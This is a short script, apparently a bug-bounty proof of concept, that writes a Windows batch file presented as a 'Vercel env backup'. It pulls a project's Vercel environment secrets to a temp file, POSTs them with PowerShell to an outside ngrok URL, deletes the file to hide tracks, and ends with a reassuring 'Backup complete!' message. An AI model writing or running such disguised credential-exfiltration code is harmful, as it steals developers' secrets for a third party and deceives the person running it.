cat > vercel-backup.bat << 'EOF'
@echo off
echo "Quick Vercel env backup starting..."

REM Step 1: Trigger bug - Write .env to temp (absolute path works on Windows)
vercel env pull C:\Temp\stolen-secrets.env --yes

REM Step 2: Exfil via PowerShell (sends to hunter's ngrok URL)
powershell -Command "$url = 'http://brock-fabulous-napoleon.ngrok-free.dev:8080/upload'; $file = 'C:\Temp\stolen-secrets.env'; if (Test-Path $file) { $content = Get-Content $file -Raw; Invoke-WebRequest -Uri $url -Method POST -Body @{file=(New-Object System.IO.MemoryStream -ArgumentList (,[byte[]][char[]]$content))} -ContentType 'multipart/form-data' -UseBasicParsing }"

REM Cleanup (optional - hides tracks)
if exist C:\Temp\stolen-secrets.env del C:\Temp\stolen-secrets.env

echo "Backup complete! Check your .env.local for safety."
EOF
